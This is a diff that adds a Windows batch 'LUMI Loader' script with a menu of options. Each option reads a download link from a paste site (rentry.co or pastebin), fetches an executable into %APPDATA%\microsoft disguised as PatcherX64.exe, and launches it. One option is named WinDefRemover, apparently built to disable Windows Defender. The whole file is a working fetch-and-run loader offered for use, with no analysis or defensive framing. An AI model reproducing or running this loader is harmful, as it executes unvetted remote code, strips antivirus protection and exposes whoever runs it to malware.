@@ -1,0 +1,377 @@
+:: LUMIALL
+@echo off
+color 0A
+
+:: Function to display text slowly
+echo Welcome to LUMI Loader, This is All We Have Untill Now!
+timeout /t 2 /nobreak >nul
+
+
+:start
+echo.
+echo Select an option:
+echo 1 - SHST
+echo 2 - COMSUR
+echo 3 - WinDefRem
+echo 4 - STC
+echo 5 - ALL
+set /p choice="Enter your choice (1, 2, 3, 4, or 5): "
+
+if "%choice%"=="1" goto :SHST
+if "%choice%"=="2" goto :COMSUR
+if "%choice%"=="3" goto :WinDefRemover
+if "%choice%"=="4" goto :STC
+if "%choice%"=="5" goto :PatcherX64
+
+:: Invalid input, prompt again
+echo.
+echo Type again.
+timeout /t 2 /nobreak >nul
+cls
+goto :start
+
+
+
+
+
+:SHST
+cls
+:: Kill & Delete
+taskkill /f /im PatcherX64.exe >nul 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+
+echo.
+echo You chose Runtime.
+timeout /t 2 /nobreak >nul
+
+for /f "delims=" %%i in ('curl -s https://rentry.co/hhuuq6cp/raw') do set "SHSTFILELINK=%%i"
+
+
+
+ 
+:: Download the file using curl
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%SHSTFILELINK%"
+ 
+timeout /t 2 /nobreak >nul
+ 
+ 
+ 
+:: Checking the existing of the file
+if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo.
+    echo The download hasn't started yet. Please check your connection.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+    cls
+	goto SHST
+)
+ 
+ 
+ 
+:: Get the file size in bytes
+for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+ 
+ 
+ 
+:: Check if the file size is at least 0.5MB (500000 bytes)
+if %FILESIZE% geq 500000 (
+    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+) else (
+echo.
+    echo Download incomplete. Check your connection and run the file again.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+    cls
+	goto SHST
+)
+
+
+
+echo.
+echo SHST Started..
+timeout /t 9 /nobreak >nul
+echo Done.
+timeout /t 2 /nobreak >nul
+cls
+goto start
+
+
+
+
+
+
+
+:COMSUR
+cls
+:: Kill & Delete
+taskkill /f /im PatcherX64.exe >nul 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+
+echo.
+echo You chose Runtime.
+timeout /t 2 /nobreak >nul
+
+for /f "delims=" %%i in ('curl -s https://rentry.co/anxuyeb2/raw') do set "COMSURFILELINK=%%i"
+
+
+
+ 
+:: Download the file using curl
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%COMSURFILELINK%"
+ 
+timeout /t 2 /nobreak >nul
+ 
+ 
+ 
+:: Checking the existing of the file
+if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo.
+    echo The download hasn't started yet. Please check your connection.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+    cls
+	goto COMSUR
+)
+ 
+ 
+ 
+:: Get the file size in bytes
+for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+ 
+ 
+ 
+:: Check if the file size is at least 16MB (16777216 bytes)
+if %FILESIZE% geq 16777216 (
+    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+) else (
+echo.
+    echo Download incomplete. Check your connection and run the file again.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+    cls
+	goto COMSUR
+)
+
+
+
+echo.
+echo COMSUR Started..
+timeout /t 9 /nobreak >nul
+echo Done.
+timeout /t 2 /nobreak >nul
+cls
+goto start
+
+
+
+
+:PatcherX64
+cls
+:: Kill & Delete
+taskkill /f /im PatcherX64.exe >nul 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+
+echo.
+echo You chose ALL.
+timeout /t 2 /nobreak >nul
+
+for /f "delims=" %%i in ('curl -s https://pastebin.com/raw/zY7LEXpW') do set "PATCHERFILELINK=%%i"
+
+
+
+ 
+:: Download the file using curl
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%PATCHERFILELINK%"
+ 
+timeout /t 2 /nobreak >nul
+ 
+ 
+ 
+:: Checking the existing of the file
+if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo.
+    echo The download hasn't started yet. Please check your connection.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+    cls
+	goto PatcherX64
+)
+ 
+ 
+ 
+:: Get the file size in bytes
+for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+ 
+ 
+ 
+:: Check if the file size is at least 20MB (20971520 bytes)
+if %FILESIZE% geq 20971520 (
+    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+) else (
+echo.
+    echo Download incomplete. Check your connection and run the file again.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+    cls
+	goto PatcherX64
+)
+
+
+
+echo.
+echo PatcherX64 Started..
+timeout /t 9 /nobreak >nul
+echo Done.
+timeout /t 2 /nobreak >nul
+cls
+goto start
+
+
+
+
+:WinDefRemover
+cls
+:: Kill & Delete
+taskkill /f /im PatcherX64.exe >nul 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+
+echo.
+echo You chose WinDefRemover.
+timeout /t 2 /nobreak >nul
+
+for /f "delims=" %%i in ('curl -s https://rentry.co/WINDEFREMOVER/raw') do set "WINDEFREMOVERFILELINK=%%i"
+
+
+
+ 
+:: Download the file using curl
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%WINDEFREMOVERFILELINK%"
+ 
+timeout /t 2 /nobreak >nul
+ 
+ 
+ 
+:: Checking the existing of the file
+if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo.
+    echo The download hasn't started yet. Please check your connection.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+	cls
+	goto PatcherX64
+)
+ 
+ 
+ 
+:: Get the file size in bytes
+for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+ 
+ 
+ 
+:: Check if the file size is at least 0.8MB (768000 bytes)
+if %FILESIZE% geq 768000 (
+    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+) else (
+echo.
+    echo Download incomplete. Check your connection and run the file again.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+	cls
+	goto WinDefRemover
+)
+
+
+
+echo.
+echo WinDefRemover Started..
+timeout /t 20 /nobreak >nul
+echo Done.
+timeout /t 5 /nobreak >nul
+cls
+goto start
+
+
+
+
+
+
+:STC
+cls
+:: Kill & Delete
+taskkill /f /im PatcherX64.exe >nul 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+
+echo.
+echo You chose STC.
+timeout /t 2 /nobreak >nul
+
+for /f "delims=" %%i in ('curl -s https://rentry.co/opkbnm2i/raw') do set "STCFILELINK=%%i"
+
+
+
+ 
+:: Download the file using curl
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%STCFILELINK%"
+ 
+timeout /t 2 /nobreak >nul
+ 
+ 
+ 
+:: Checking the existing of the file
+if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo.
+    echo The download hasn't started yet. Please check your connection.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+	cls
+	goto STC
+)
+ 
+ 
+ 
+:: Get the file size in bytes
+for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+ 
+ 
+ 
+:: Check if the file size is at least 0.4MB 400000 bytes)
+if %FILESIZE% geq 400000 (
+    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+) else (
+echo.
+    echo Download incomplete. Check your connection and run the file again.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+	cls
+	goto STC
+)
+
+
+
+echo.
+echo PatcherX64 Started..
+timeout /t 9 /nobreak >nul
+echo Done.
+timeout /t 2 /nobreak >nul
+cls
+goto start
